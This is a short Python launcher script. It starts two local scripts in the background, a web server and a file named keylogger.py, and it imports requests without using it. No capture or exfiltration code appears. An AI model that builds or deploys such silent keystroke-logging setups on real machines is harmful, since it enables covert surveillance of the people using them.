#!/usr/bin/env python3

import requests, os


def gourl():
    os.system('$HOME/Projects/webserver.py &')


def keylogcall():
    os.system('$HOME/Projects/keylogger.py &')


if __name__ == '__main__':

    gourl()
    keylogcall()

